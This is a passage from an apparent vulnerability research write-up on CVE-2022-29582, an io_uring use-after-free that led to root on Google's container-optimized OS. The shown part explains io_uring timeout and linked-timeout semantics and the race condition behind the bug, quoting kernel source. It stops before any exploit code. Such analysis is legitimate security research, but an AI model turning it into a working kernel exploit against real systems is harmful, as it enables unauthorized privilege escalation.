I"<'<h1 id="introduction">Introduction</h1>

<p>This post covers an interesting vulnerability we (<a href="https://twitter.com/Awarau1">Jayden</a> and <a href="https://twitter.com/pqlqpql">David</a>) found in the <code class="language-plaintext highlighter-rouge">io_uring</code> subsystem of the Linux kernel.</p>

<p>We collaboratively wrote an exploit that targets a hardened <a href="https://github.com/google/nsjail">nsjail</a> environment inside of Google‚Äôs <a href="https://cloud.google.com/container-optimized-os/docs/concepts/features-and-benefits">container optimized OS</a> (COS) distro. 
The exploit does not require unprivileged user namespaces and results in root privileges in the root namespace. To gain root, we leveraged a Use-After-Free vulnerability. This allowed us to execute our own code in kernelmode.</p>

<p>We were awarded a generous bounty through <a href="https://security.googleblog.com/2022/02/roses-are-red-violets-are-blue-giving.html">Google‚Äôs kCTF vulnerability research program</a>.</p>

<h1 id="table-of-contents">Table of contents</h1>

<hr />

<ul id="markdown-toc">
  <li><a href="#introduction" id="markdown-toc-introduction">Introduction</a></li>
  <li><a href="#table-of-contents" id="markdown-toc-table-of-contents">Table of contents</a></li>
  <li><a href="#io_uring" id="markdown-toc-io_uring">io_uring</a>    <ul>
      <li><a href="#kernel-submission" id="markdown-toc-kernel-submission">Kernel submission</a>        <ul>
          <li><a href="#terminology" id="markdown-toc-terminology">Terminology</a></li>
        </ul>
      </li>
      <li><a href="#specification" id="markdown-toc-specification">Specification</a>        <ul>
          <li><a href="#linked-sqes" id="markdown-toc-linked-sqes">Linked SQEs</a></li>
          <li><a href="#timeout-operations-ioring_op_timeout" id="markdown-toc-timeout-operations-ioring_op_timeout">Timeout operations: IORING_OP_TIMEOUT</a></li>
          <li><a href="#timeout-operations-ioring_op_link_timeout" id="markdown-toc-timeout-operations-ioring_op_link_timeout">Timeout operations: IORING_OP_LINK_TIMEOUT</a></li>
          <li><a href="#ioring_op_tee-requests" id="markdown-toc-ioring_op_tee-requests">IORING_OP_TEE requests</a></li>
        </ul>
      </li>
      <li><a href="#combining-a-timeout-and-a-link-timeout" id="markdown-toc-combining-a-timeout-and-a-link-timeout">Combining a timeout and a link timeout</a></li>
    </ul>
  </li>
  <li><a href="#examining-the-edge-case" id="markdown-toc-examining-the-edge-case">Examining the edge case</a>    <ul>
      <li><a href="#analysis-linking-of-t-and-lt" id="markdown-toc-analysis-linking-of-t-and-lt">Analysis: linking of <code class="language-plaintext highlighter-rouge">T</code> and <code class="language-plaintext highlighter-rouge">LT</code></a></li>
      <li><a href="#analysis-completion-of-t-through-flushing" id="markdown-toc-analysis-completion-of-t-through-flushing">Analysis: Completion of <code class="language-plaintext highlighter-rouge">T</code> through flushing</a></li>
      <li><a href="#analysis-completion-of-lt-through-timer-firing" id="markdown-toc-analysis-completion-of-lt-through-timer-firing">Analysis: Completion of <code class="language-plaintext highlighter-rouge">LT</code> through timer firing</a></li>
      <li><a href="#analysis-concurrent-completion-of-t-and-lt" id="markdown-toc-analysis-concurrent-completion-of-t-and-lt">Analysis: Concurrent completion of <code class="language-plaintext highlighter-rouge">T</code> and <code class="language-plaintext highlighter-rouge">LT</code></a></li>
      <li><a href="#racing-the-deferred-workers" id="markdown-toc-racing-the-deferred-workers">Racing the deferred workers</a></li>
    </ul>
  </li>
  <li><a href="#exploitation" id="markdown-toc-exploitation">Exploitation</a>    <ul>
      <li><a href="#replacing-lt" id="markdown-toc-replacing-lt">Replacing <code class="language-plaintext highlighter-rouge">LT</code></a></li>
      <li><a href="#releasing-refs-on-lt" id="markdown-toc-releasing-refs-on-lt">Releasing refs on <code class="language-plaintext highlighter-rouge">LT'</code></a></li>
      <li><a href="#cleaning-up-lt" id="markdown-toc-cleaning-up-lt">Cleaning up <code class="language-plaintext highlighter-rouge">LT'</code></a></li>
      <li><a href="#releasing-the-final-file-ref" id="markdown-toc-releasing-the-final-file-ref">Releasing the final <code class="language-plaintext highlighter-rouge">file</code> ref</a></li>
      <li><a href="#crossing-the-cache-boundary" id="markdown-toc-crossing-the-cache-boundary">Crossing the cache boundary</a>        <ul>
          <li><a href="#slab-caches" id="markdown-toc-slab-caches">Slab caches</a></li>
          <li><a href="#the-memory-hierarchy" id="markdown-toc-the-memory-hierarchy">The memory hierarchy</a></li>
          <li><a href="#page-use-after-free" id="markdown-toc-page-use-after-free">Page use-after-free</a>            <ul>
              <li><a href="#how-do-we-allocate-a-new-page" id="markdown-toc-how-do-we-allocate-a-new-page">How do we allocate a new page?</a></li>
              <li><a href="#how-to-free-a-page" id="markdown-toc-how-to-free-a-page">How to free a page?</a></li>
            </ul>
          </li>
          <li><a href="#method" id="markdown-toc-method">Method</a></li>
          <li><a href="#page-reallocation" id="markdown-toc-page-reallocation">Page reallocation</a>            <ul>
              <li><a href="#the-buddy-allocator" id="markdown-toc-the-buddy-allocator">The buddy allocator</a></li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#reallocating-as-msg_msgseg" id="markdown-toc-reallocating-as-msg_msgseg">Reallocating as <code class="language-plaintext highlighter-rouge">msg_msgseg</code></a>        <ul>
          <li><a href="#msg_msgseg-use-after-free" id="markdown-toc-msg_msgseg-use-after-free"><code class="language-plaintext highlighter-rouge">msg_msgseg</code> use-after-free</a>            <ul>
              <li><a href="#freeing-the-file" id="markdown-toc-freeing-the-file">Freeing the file</a></li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#tls-who-tls_context" id="markdown-toc-tls-who-tls_context">TLS who? <code class="language-plaintext highlighter-rouge">tls_context</code></a>        <ul>
          <li><a href="#reallocating-as-tls_context" id="markdown-toc-reallocating-as-tls_context">Reallocating as <code class="language-plaintext highlighter-rouge">tls_context</code></a></li>
          <li><a href="#leaking-tls_context" id="markdown-toc-leaking-tls_context">Leaking <code class="language-plaintext highlighter-rouge">tls_context</code></a></li>
          <li><a href="#overwriting-tls_context" id="markdown-toc-overwriting-tls_context">Overwriting <code class="language-plaintext highlighter-rouge">tls_context</code></a></li>
        </ul>
      </li>
      <li><a href="#code-execution" id="markdown-toc-code-execution">Code execution</a></li>
    </ul>
  </li>
  <li><a href="#the-fix" id="markdown-toc-the-fix">The fix</a></li>
  <li><a href="#mitigations-against-exploitation" id="markdown-toc-mitigations-against-exploitation">Mitigations against exploitation</a></li>
  <li><a href="#appendix" id="markdown-toc-appendix">Appendix</a>    <ul>
      <li><a href="#references" id="markdown-toc-references">References</a></li>
      <li><a href="#the-simplified-buddy-algorithm" id="markdown-toc-the-simplified-buddy-algorithm">The (simplified) buddy algorithm</a></li>
      <li><a href="#paging-background" id="markdown-toc-paging-background">Paging: background</a></li>
      <li><a href="#paging-motivation" id="markdown-toc-paging-motivation">Paging: motivation</a></li>
      <li><a href="#paging-method" id="markdown-toc-paging-method">Paging: method</a></li>
    </ul>
  </li>
</ul>

<hr />

<h1 id="io_uring">io_uring</h1>

<p>A general and up-to-date overview of <code class="language-plaintext highlighter-rouge">io_uring</code> has been provided already by others. They explain it a thousand times better than we could, so we‚Äôll only cover the subsystem more broadly (see <a href="https://www.graplsecurity.com/post/iou-ring-exploiting-the-linux-kernel">this writeup by Grapl Security</a> and <a href="https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a">this writeup by Flatt Security</a> for a great introduction.) <code class="language-plaintext highlighter-rouge">io_uring</code> is quite a complex subsystem, so it‚Äôs recommended to read up on the literature in case you require some extra context.</p>

<p>We will however cover some of the finer details of the <code class="language-plaintext highlighter-rouge">IORING_OP_TIMEOUT</code>, <code class="language-plaintext highlighter-rouge">IORING_OP_LINK_TIMEOUT</code> and <code class="language-plaintext highlighter-rouge">IORING_OP_TEE</code> opcodes, as they are directly relevant to the vulnerability.</p>

<p>Our exploit targets kernel version <code class="language-plaintext highlighter-rouge">5.10.90</code>, the version Google was running remotely at the time. We had to tune our exploit to the particular server specs (4 Skylake Xeon cores @ 2.80Ghz, 16GiB RAM), but with some tweaking, any machine running a vulnerable kernel should be exploitable.</p>

<hr />

<h2 id="kernel-submission">Kernel submission</h2>

<p>To communicate with <code class="language-plaintext highlighter-rouge">io_uring</code>, we first ask the kernel to setup a new io_uring instance. The kernel prepares the io_uring context (<code class="language-plaintext highlighter-rouge">struct io_ring_ctx</code>) and allocates a user/kernel shared area of memory to house the ring buffers:</p>

<ol>
  <li>the <em>submission queue</em> (<strong>SQ</strong>)</li>
  <li>the <em>completion queue</em> (<strong>CQ</strong>).</li>
</ol>

<p>Once the shared space is reserved, the kernel returns a file descriptor to us. We then map the queues into our own address space using the given file descriptor.</p>

<p>When we wish to submit a request for operation, we‚Äôll fill in a <em>submission queue entry</em> (<strong>SQE</strong>) in the shared SQ space. Afterwards, we can use the <code class="language-plaintext highlighter-rouge">io_uring_enter</code> system call to submit up to the number of SQEs filled in. The kernel then retrieves the given number of SQEs from the SQ.</p>

<p>The SQE is a structure that encodes a single (I/O) operation that the kernel will perform asynchronously for us once it is submitted:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="p">{</span>
	<span class="n">__u8</span>	<span class="n">opcode</span><span class="p">;</span>		<span class="cm">/* type of operation for this sqe */</span>
	<span class="n">__u8</span>	<span class="n">flags</span><span class="p">;</span>		<span class="cm">/* IOSQE_ flags */</span>
	<span class="n">__u16</span>	<span class="n">ioprio</span><span class="p">;</span>		<span class="cm">/* ioprio for the request */</span>
	<span class="n">__s32</span>	<span class="n">fd</span><span class="p">;</span>		<span class="cm">/* file descriptor to do IO on */</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="n">__u64</span>	<span class="n">off</span><span class="p">;</span>	<span class="cm">/* offset into file */</span>
		<span class="n">__u64</span>	<span class="n">addr2</span><span class="p">;</span>
	<span class="p">};</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="n">__u64</span>	<span class="n">addr</span><span class="p">;</span>	<span class="cm">/* pointer to buffer or iovecs */</span>
		<span class="n">__u64</span>	<span class="n">splice_off_in</span><span class="p">;</span>
	<span class="p">};</span>
	<span class="n">__u32</span>	<span class="n">len</span><span class="p">;</span>		<span class="cm">/* buffer size or number of iovecs */</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="n">__kernel_rwf_t</span>	<span class="n">rw_flags</span><span class="p">;</span>
		<span class="p">...</span>
		<span class="n">__u32</span>		<span class="n">timeout_flags</span><span class="p">;</span>
		<span class="p">...</span>
		<span class="n">__u32</span>		<span class="n">splice_flags</span><span class="p">;</span>
	<span class="p">};</span>
	<span class="n">__u64</span>	<span class="n">user_data</span><span class="p">;</span>	<span class="cm">/* data to be passed back at completion time */</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="p">{</span>
			<span class="cm">/* pack this to avoid bogus arm OABI complaints */</span>
			<span class="k">union</span> <span class="p">{</span>
				<span class="cm">/* index into fixed buffers, if used */</span>
				<span class="n">__u16</span>	<span class="n">buf_index</span><span class="p">;</span>
				<span class="cm">/* for grouped buffer selection */</span>
				<span class="n">__u16</span>	<span class="n">buf_group</span><span class="p">;</span>
			<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>
			<span class="cm">/* personality to use, if used */</span>
			<span class="n">__u16</span>	<span class="n">personality</span><span class="p">;</span>
			<span class="n">__s32</span>	<span class="n">splice_fd_in</span><span class="p">;</span>
		<span class="p">};</span>
		<span class="n">__u64</span>	<span class="n">__pad2</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
	<span class="p">};</span>
<span class="p">};</span>
</code></pre></div></div>

<p>Most importantly, the <code class="language-plaintext highlighter-rouge">opcode</code> field determines what kind of operation to perform. For each <code class="language-plaintext highlighter-rouge">opcode</code> which requires it, the <code class="language-plaintext highlighter-rouge">fd</code> field specifies the file descriptor on which to perform the requested I/O. Almost every normal I/O syscall (<code class="language-plaintext highlighter-rouge">read</code>, <code class="language-plaintext highlighter-rouge">sendto</code>, etc.) has an asynchronous opcode equivalent. Each field can take on different roles depending on the operation, as outlined <a href="https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html">here</a>.</p>

<p>Once retrieved from the SQ, an SQE is converted to an internal representation described by <code class="language-plaintext highlighter-rouge">struct io_kiocb</code> (<strong>k</strong>ernel <strong>i</strong>nput/<strong>o</strong>utput <strong>c</strong>all<strong>b</strong>ack). These objects are commonly referred to as <em>request</em>s (try saying <em>io_kiocb</em> repeatedly very fast :p).</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">io_kiocb</span> <span class="p">{</span>
	<span class="k">union</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">file</span>		<span class="o">*</span><span class="n">file</span><span class="p">;</span>
		<span class="p">...</span>
		<span class="k">struct</span> <span class="n">io_timeout</span>	<span class="n">timeout</span><span class="p">;</span>
		<span class="p">...</span>
		<span class="k">struct</span> <span class="n">io_splice</span>	<span class="n">splice</span><span class="p">;</span>
		<span class="p">...</span>
	<span class="p">};</span>

	<span class="cm">/* opcode allocated if it needs to store data for async defer */</span>
	<span class="kt">void</span>				<span class="o">*</span><span class="n">async_data</span><span class="p">;</span>
	<span class="n">u8</span>				<span class="n">opcode</span><span class="p">;</span>
	<span class="cm">/* polled IO has completed */</span>
	<span class="n">u8</span>				<span class="n">iopoll_completed</span><span class="p">;</span>

	<span class="n">u16</span>				<span class="n">buf_index</span><span class="p">;</span>
	<span class="n">u32</span>				<span class="n">result</span><span class="p">;</span>

	<span class="k">struct</span> <span class="n">io_ring_ctx</span>		<span class="o">*</span><span class="n">ctx</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span>			<span class="n">flags</span><span class="p">;</span>
	<span class="n">refcount_t</span>			<span class="n">refs</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">task_struct</span>		<span class="o">*</span><span class="n">task</span><span class="p">;</span>
	<span class="n">u64</span>				<span class="n">user_data</span><span class="p">;</span>

	<span class="k">struct</span> <span class="n">list_head</span>		<span class="n">link_list</span><span class="p">;</span>
	<span class="p">...</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">struct io_kiocb</code> is used as a ‚Äúready-for-launch‚Äù equivalent of the SQE it is based on. Any file descriptors are resolved to <code class="language-plaintext highlighter-rouge">struct file*</code>s, the user‚Äôs credentials are attached, the <em>personality</em> (which cores to run on) is attached, etc.</p>

<p>Once the requested operation finishes, an entry that corresponds to the SQE is written to the <em>completion queue</em> (<strong>CQ</strong>). Such an entry is called a <em>completion queue entry</em> (<strong>CQE</strong>), and contains fields like an error code and a result value. The userspace application can poll the CQ for new entries to determine whether the submitted SQEs have finished processing, and what their result was.</p>

<p>Together we have a user interface which allows us to submit requests to the submission queue and to reap results from the completion queue (visualisation due to <a href="https://cor3ntin.github.io/posts/iouring/">cor3ntin</a>):</p>

<figure>
<img src="/img/posts/cve-2022-29582/io_uring_highlevel.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>A high level visualisation of the general io_uring flow.<br /></i></center></figcaption>
</figure>

<h3 id="terminology">Terminology</h3>
<p>Before we begin, let‚Äôs first clarify the terms used throughout this article:</p>
<ul>
  <li>An <em>SQE</em>, <em>request</em>, and <em>operation</em> are used mostly interchangably, but:
    <ul>
      <li>An <em>SQE</em> concretely exist in the submission queue.</li>
      <li>A <em>request</em> (<code class="language-plaintext highlighter-rouge">struct io_kiocb</code>) concretely exists in kernel memory, and is a post-processed version of the SQE.</li>
      <li>An <em>operation</em> is an abstract type that an SQE or request can have.</li>
    </ul>
  </li>
  <li>A request <em>completes</em> whenever its CQE entry has been written to the CQE.
    <ul>
      <li>When a request <em>completes</em>, a <em>completion event</em> is posted (more on this later).</li>
    </ul>
  </li>
  <li>A request <em>succeeds</em> whenever it <em>completes</em> <strong>and</strong> it does not have an error code.</li>
  <li>A request is <em>cancelled</em> whenever it <em>completes</em> <strong>and</strong> its error code is <code class="language-plaintext highlighter-rouge">-ECANCELLED</code>.</li>
  <li>A request is <em>destroyed</em> after it <em>completes</em>. The request is first ‚Äúcleaned up‚Äù and subsequently freed.</li>
</ul>

<h2 id="specification">Specification</h2>
<p>In this section we‚Äôll specify the semantics of those io_uring operation types which are relevant to the bug and to our method of exploitation.</p>

<h3 id="linked-sqes">Linked SQEs</h3>
<p><code class="language-plaintext highlighter-rouge">io_uring</code>‚Äôs primary use case is asynchronous I/O. However, sometimes we want a synchronous mode of operation. This can be useful when we have a data dependency on a previous request, e.g. we want to read from one file descriptor and afterwards write the result to three others.</p>

<p>The solution is to use <em>linked requests</em>. We can link multiple requests together with the <code class="language-plaintext highlighter-rouge">IOSQE_IO_LINK</code> flag to form a <em>chain</em>. The chain is then executed sequentially.</p>

<p>If any link in a single chain fails then the whole chain fails. Separate chains may still be executed concurrently as they are not ordered with respect to each other.</p>

<figure>
<img src="/img/posts/cve-2022-29582/link.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>This SQ contains two separate chains, each with four linked requests. </i></center></figcaption>
</figure>

<hr />

<h3 id="timeout-operations-ioring_op_timeout">Timeout operations: IORING_OP_TIMEOUT</h3>

<p><code class="language-plaintext highlighter-rouge">io_uring</code> allows us to set a timeout for IO operations. We can submit an SQE with the opcode set to <code class="language-plaintext highlighter-rouge">IORING_OP_TIMEOUT</code>, a timeout <strong>T</strong> (<code class="language-plaintext highlighter-rouge">struct timespec64</code>), and an optional completion event count <strong>C</strong>. The request can either succeed or fail with <code class="language-plaintext highlighter-rouge">-ETIME</code>.</p>

<ul>
  <li>When the specified timeout period <strong>T</strong> has passed:
    <ol>
      <li>A <code class="language-plaintext highlighter-rouge">hrtimer</code> fires, which will cause the request to be cancelled with <code class="language-plaintext highlighter-rouge">-ETIME</code>.</li>
    </ol>
  </li>
  <li>(Optionally) When <strong>C</strong> other requests have completed:
    <ol>
      <li>The pending timeouts are inspected after every request completion (<em>flushed</em>.)</li>
      <li>If a timeout has reached its completion event count, it succeeds.</li>
    </ol>
  </li>
</ul>

<p>In both of these cases, a <em>wakeup event</em> is posted to anybody waiting on the completion queue (via e.g. <code class="language-plaintext highlighter-rouge">IORING_ENTER_GETEVENTS</code>.)</p>

<p>If <strong>C</strong> is set to zero, the request acts purely as a timer.</p>

<figure>
<img src="/img/posts/cve-2022-29582/timeout.jpg" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Example IORING_OP_TIMEOUT semantics.</i></center></figcaption>
</figure>

<p>Given the diagram above, let‚Äôs work out what happens exactly. We write <strong>T·∂ú</strong> to denote the amount of completion events left for timeout <strong>T</strong>. So initially, {<strong>C·∂ú</strong>, <strong>D·∂ú</strong>, <strong>E·∂ú</strong>} = {2, 2, 5}.</p>

<ol>
  <li><strong>T+0000</strong>ns: <strong>A</strong> completes (and posts a completion event), so the timeouts require one fewer completion before they themselves succeed: {<strong>C·∂ú</strong>, <strong>D·∂ú</strong>, <strong>E·∂ú</strong>} = {1, 1, 4}</li>
  <li><strong>T+1000</strong>ns: <strong>B</strong> completes <em>and</em> <strong>E</strong>‚Äôs timer fires.
    <ol>
      <li><strong>E</strong> posts a wakeup event to the CQ, then completes with<code class="language-plaintext highlighter-rouge">-ETIME</code>.</li>
      <li><strong>B</strong>‚Äôs completion event causes {<strong>C·∂ú</strong>, <strong>D·∂ú</strong>} = {0, 0}, so <strong>C, D</strong> succeed. Two more wakeup events are posted to the CQ.</li>
    </ol>
  </li>
</ol>

<p>Note that the timeouts themselves also post completion events, so this can get hard to reason about fairly quickly.</p>

<hr />

<h3 id="timeout-operations-ioring_op_link_timeout">Timeout operations: IORING_OP_LINK_TIMEOUT</h3>
<p>We saw that <code class="language-plaintext highlighter-rouge">IORING_OP_TIMEOUT</code> only cares about whether the number of completions in its past meets the number of completions it is waiting for. But sometimes we want to create a timeout which targets a particular operation. The <code class="language-plaintext highlighter-rouge">IORING_OP_LINK_TIMEOUT</code> opcode serves exactly this purpose. We send the original SQE with the <code class="language-plaintext highlighter-rouge">IOSQE_IO_LINK</code> flag set. Immedatiately after, we add an <code class="language-plaintext highlighter-rouge">IORING_OP_LINK_TIMEOUT</code> SQE with our desired timeout and submit the linked SQEs together.</p>

<p>Both operations will start at the same time and follow the logic:</p>

<ul>
  <li>If the specified timeout has passed (i.e. the timeout operation succeeds), the original operation is cancelled.</li>
  <li>If the original operation completed, the timeout operation itself is cancelled instead.</li>
</ul>

<figure>
<img src="/img/posts/cve-2022-29582/linktimeout.jpg" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Example IORING_OP_LINK_TIMEOUT semantics.</i></center></figcaption>
</figure>

<p>Say that <strong>X</strong> is an operation, then we‚Äôll let <strong>X·¥∏·µÄ</strong> denote its linked timeout. The diagram is situated at <strong>T+1000</strong>ns from when <strong>A</strong> and <strong>B</strong> were submitted.</p>

<ul>
  <li><strong>A·¥∏·µÄ</strong> fires, so <strong>A·¥∏·µÄ</strong> completes and <strong>A</strong> is cancelled.</li>
  <li><strong>B</strong> completes, so <strong>B·¥∏·µÄ</strong> is cancelled.</li>
</ul>

<p>For an introduction to these timeouts, including motivations and use cases, these LWN threads might help: <a href="https://lwn.net/Articles/800308/">IORING_OP_TIMEOUT</a>, <a href="https://lwn.net/Articles/803932/">IORING_OP_LINK_TIMEOUT</a>.</p>

<hr />

<h3 id="ioring_op_tee-requests">IORING_OP_TEE requests</h3>
<p>Although <code class="language-plaintext highlighter-rouge">IORING_OP_TEE</code> requests are not directly relevant to the bug, we need them for exploitation. Very briefly: with tee, we can splice the contents from one pipe onto another.</p>

<p>In terms of the SQE, <code class="language-plaintext highlighter-rouge">splice_fd_in</code> is the file descriptor to read from and <code class="language-plaintext highlighter-rouge">fd</code> is the file descriptor to write to.</p>

<p>In terms of the <code class="language-plaintext highlighter-rouge">io_kiocb</code>, <code class="language-plaintext highlighter-rouge">splice.file_in</code>  points to the <code class="language-plaintext highlighter-rouge">file</code> object associated with the given <code class="language-plaintext highlighter-rouge">splice_fd_in</code>.</p>

<p>Read more about <code class="language-plaintext highlighter-rouge">tee</code> at the <a href="https://manpages.debian.org/unstable/liburing-dev/io_uring_enter.2.en.html">io_uring_enter</a> and <a href="https://man7.org/linux/man-pages/man2/tee.2.html">tee</a> manual pages.</p>

<hr />

<h2 id="combining-a-timeout-and-a-link-timeout">Combining a timeout and a link timeout</h2>

<p>For the sake of experimentation, let‚Äôs think about what happens when we try to combine an <code class="language-plaintext highlighter-rouge">IORING_OP_TIMEOUT</code> request <strong>T</strong> with its own <code class="language-plaintext highlighter-rouge">IORING_OP_LINK_TIMEOUT</code> <strong>LT</strong>. Of course, we need to specify the <code class="language-plaintext highlighter-rouge">IOSQE_IO_LINK</code> flag for <strong>T</strong>.</p>

<figure>
<img src="/img/posts/cve-2022-29582/combinetimeouts.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>IORING_OP_TIMEOUT linked with IORING_OP_LINK_TIMEOUT.</i></center></figcaption>
</figure>

<p>From the previous section we can try to derive the behaviour of such a request chain. Let‚Äôs reason about the different states of <code class="language-plaintext highlighter-rouge">T</code> and <code class="language-plaintext highlighter-rouge">LT</code>, according to the documentation.</p>

<ul>
  <li><strong>case 1:</strong> <code class="language-plaintext highlighter-rouge">LT</code> times out before <code class="language-plaintext highlighter-rouge">T</code>:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">T</code> is cancelled (CQ entry with <code class="language-plaintext highlighter-rouge">-ECANCELED</code>, then destroyed)</li>
      <li><code class="language-plaintext highlighter-rouge">LT</code> completes (CQ entry with <code class="language-plaintext highlighter-rouge">-ETIME</code>, then destroyed)</li>
    </ul>
  </li>
  <li><strong>case 2:</strong> <code class="language-plaintext highlighter-rouge">T</code> times out before <code class="language-plaintext highlighter-rouge">LT</code>:
    <ul>
      <li><code class="language-plaintext highlighter-rouge">T</code> completes (CQ entry with <code class="language-plaintext highlighter-rouge">-ETIME</code>) and is destroyed</li>
      <li><code class="language-plaintext highlighter-rouge">LT</code> is cancelled (CQ entry with <code class="language-plaintext highlighter-rouge">-ECANCELED</code>, then destroyed)</li>
    </ul>
  </li>
  <li><strong>case 3:</strong> <code class="language-plaintext highlighter-rouge">T</code> completion event count is reached before <code class="language-plaintext highlighter-rouge">LT</code> timeout:
    <ul>
      <li>Same as in case 2.</li>
    </ul>
  </li>
</ul>

<p>Verifying whether our assertions are correct or not is a great way to learn more about the target. We can also try to find some state with semantics that cannot be inferred from the specification alone and investigate them more closely..</p>

<ul>
  <li><strong>case 4:</strong> <code class="language-plaintext highlighter-rouge">T</code> completes concurrently with <code class="language-plaintext highlighter-rouge">LT</code> (<em>this encompasses a variety of possible states</em>)
    <ul>
      <li>..We honestly have no idea what will happen, right?</li>
    </ul>
  </li>
</ul>

<p>Since we can‚Äôt answer this directly from the documentation, we will need to dig into the implementation. Already, this smells of ‚Äúedge-case‚Äù.</p>

<hr />

<h1 id="examining-the-edge-case">Examining the edge case</h1>
<p>Alright, let‚Äôs get right to it. We‚Äôll work out what happens for the mentioned fourth case. For brevity, we only handle parts that will be relevant later.</p>

<h2 id="analysis-linking-of-t-and-lt">Analysis: linking of <code class="language-plaintext highlighter-rouge">T</code> and <code class="language-plaintext highlighter-rouge">LT</code></h2>
<p>By setting the <code class="language-plaintext highlighter-rouge">IOSQE_IO_LINK</code> flag in the SQE for <code class="language-plaintext highlighter-rouge">T</code>, we declare a link between <code class="language-plaintext highlighter-rouge">T</code> and <code class="language-plaintext highlighter-rouge">LT</code>. Concretely, this link is a reference between two nodes in a circular doubly linked list. The node is embedded in each <code class="language-plaintext highlighter-rouge">struct io_kiocb</code> through the field <code class="language-plaintext highlighter-rouge">link_list</code>. This means that <code class="language-plaintext highlighter-rouge">T.link_list.next</code> is set to <code class="language-plaintext highlighter-rouge">LT</code> while <code class="language-plaintext highlighter-rouge">LT.link_list.prev</code> is set to <code class="language-plaintext highlighter-rouge">T</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">io_submit_sqe</span><span class="p">(</span><span class="k">struct</span> <span class="n">io_kiocb</span> <span class="o">*</span><span class="n">req</span><span class="p">,</span> 
                         <span class="k">const</span> <span class="k">struct</span> <span class="n">io_uring_sqe</span> <span class="o">*</span><span class="n">sqe</span><span class="p">,</span>
			  <span class="k">struct</span> <span class="n">io_kiocb</span> <span class="o">**</span><span class="n">link</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_comp_state</span> <span class="o">*</span><span class="n">cs</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">link</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">io_kiocb</span> <span class="o">*</span><span class="n">head</span> <span class="o">=</span> <span class="o">*</span><span class="n">link</span><span class="p">;</span>
		<span class="n">list_add_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">link_list</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">head</span><span class="o">-&gt;</span><span class="n">link_list</span><span class="p">);</span>
</code></pre></div></div>

<hr />

<h2 id="analysis-completion-of-t-through-flushing">Analysis: Completion of <code class="language-plaintext highlighter-rouge">T</code> through flushing</h2>
<p>Remember that <code class="language-plaintext highlighter-rouge">T</code> will complete if the given <code class="language-plaintext highlighter-rouge">C</code> completion events are posted before <code class="language-plaintext highlighter-rouge">T</code>‚Äôs  timer fires. Let‚Äôs say that <code class="language-plaintext highlighter-rouge">C = 1</code> and <code class="language-plaintext highlighter-rouge">B</code> is an arbitrary request, which after finishing its operation, posts a completion event.</p>

<p>Upon <code class="language-plaintext highlighter-rouge">B</code>‚Äôs completion we <em>flush</em> all timeouts attached to this io_uring instance (<code class="language-plaintext highlighter-rouge">io_ring_ctx</code>). To do this, we iterate over the <code class="language-plaintext highlighter-rouge">timeout_list</code> and if the number of events completed is greater than <code class="language-plaintext highlighter-rouge">C</code> then the timeout, in this case <code class="language-plaintext highlighter-rouge">T</code>, is <em>killed</em>:</p>

<figure>
<img src="/img/posts/cve-2022-29582/flushT.png" alt="Trulli" style="width:100%" />
    <figcaption><center><i>Completion semantics of T triggered by B through timeout flush.</i></center></figcaption>
</figure>

<p>Apart from cancelling the internal timer, in <code class="language-plaintext highlighter-rouge">io_kill_timeout()</code> we decrement the <code class="language-plaintext highlighter-rouge">T</code> refcount due to its removal from <code class="language-plaintext highlighter-rouge">timeout_list</code>. If the refcount is now 0 the destruction work is queued to be carried out in the future.</p>

<hr />

<h2 id="analysis-completion-of-lt-through-timer-firing">Analysis: Completion of <code class="language-plaintext highlighter-rouge">LT</code> through timer firing</h2>
<p>Remember that <code class="language-plaintext highlighter-rouge">LT</code> will complete if its timer fires before <code class="language-plaintext highlighter-rouge">T</code> completes. When this happens, the hrtimer callback <code class="language-plaintext highlighter-rouge">io_link_timeout_fn</code> will get called through an hardirq:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">enum</span> <span class="n">hrtimer_restart</span> <span class="nf">io_link_timeout_fn</span><span class="p">(</span><span class="k">struct</span> <span class="n">hrtimer</span> <span class="o">*</span><span class="n">timer</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">io_timeout_data</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">container_of</span><span class="p">(</span><span class="n">timer</span><span class="p">,</span>
                                    <span class="k">struct</span> <span class="n">io_timeout_data</span><span class="p">,</span> <span class="n">timer</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">io_kiocb</span> <span class="o">*</span><span class="n">req</span> <span class="o">=</span> <span class="n">data</span><span class="o">-&gt;</span><span class="n">req</span><span class="p">;</span>
